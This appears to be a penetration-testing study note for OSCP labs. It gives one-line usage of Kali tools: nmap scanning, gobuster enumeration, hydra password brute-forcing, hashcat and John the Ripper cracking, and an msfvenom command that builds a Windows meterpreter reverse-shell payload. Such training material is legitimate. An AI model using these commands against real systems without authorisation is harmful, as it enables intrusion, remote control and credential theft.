# Kali (Tools)

- [openvpn](#openvpn): OSCP Labs Environment VPN client
- [netdiscover](#netdiscover): Discover network members by listening for ARP
- [nmap](#nmap): Network / port scanner with ability to fingerprint services
- [gobuster](#gobuster): HTTP webserver directory enumeration
- [searchsploit](#searchsploit): Keyword search on vulnerability / exploit database
- [msfvenom](#msfvenom): Generate exploit payloads
- [hydra](#hydra): Brute force / password spraying tool
- [hashcat](#hashcat): Cracks hashes with dictionary attack
- [ssh2john](#ssh2john): Extract password-hash from password-protected RSA private keys
- [john (John the Ripper)](#john-john-the-ripper): Password "recovery" (cracking) tool with various input formats


## openvpn

During the lab they will give you the URL of an OpenVNC Access Server, where you will authenticate with your lab credentials and be able to download an OpenVPN profile (i.e. a `.ovpn` file).

You can then connect to the VPN with the profile with:

```
sudo openvpn *.ovpn
```

You should immediately have a private IP for the network you joined.

## netdiscover

Discover network members by listening for ARP with:

```
netdiscover -i ${INTERFACE}
```

- You can list interfaces in linux with `ifconfig`

## nmap

> Cheatsheet [here](./../../cheatsheets/kali/nmap.md)

Scan a target host for open ports:

```
nmap -Pn -T4 -v -p- ${TARGET} -oN ${OUTPUT_LOG_FILE}
```

## gobuster

Enumerate a webserver's directories with:

```
gobuster dir -u http://${TARGET} -w ${PATH_TO_WORDLIST}
```

- Wordlists in Kali are all under `/usr/share/wordlists`
- You may also specify file extensions to try with the `-x` flag e.g. `-x '.php,.html,.js'`
- You may also specify non-default exclusion status codes witht he `-b` flag e.g. `-b 404,302`


## searchsploit

Search for exploits with:

```
searchsploit ${KEYWORD}
```

## msfvenom

Generate exploit payloads, e.g. you may craft a reverse shell for windows with:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=${YOUR_HOST} LPORT=${YOUR_LISTENER_PORT} -f exe > ${OUTPUT_FILENAME}
```

## hydra

Brute force / spray passwords against well known services e.g. ftp, ssh, mysql...

You may target a mysql server with

```
hydra mysql://${TARGET_HOST} -l ${USERNAME} -P ${PASSWORD_WORDLIST}
```

- Wordlists in Kali are all under `/usr/share/wordlists`
- You may also use the `-L` option for username wordlist
- You may also use the `-p` option to try only one password
- You may also use the `-C` option to provide a file of colon separated username:password combinations

## hashcat

> Cheatsheet [here](./../../cheatsheets/kali/hashcat.md)

Crack password hashes for a variety of techniques. e.g. crack an md5 hash (e.g. `-m 0`):

```
hashcat -m ${MODE} -o ${OUTPUT_FILE_PATH} ${HASHES_FILE} ${WORDLIST}
```

## ssh2john

Extract password-hash from password-protected RSA private keys with:

```
ssh2john ${PATH_TO_INPUT_PASS_PROTECTED_KEY} > ${PATH_TO_OUTPUT_FILE}
```

## john (John the Ripper)

Password "recovery" (cracking) tool with various input formats

```
john ${PASSWORD_FILE} --wordlist=${WORDLIST}
```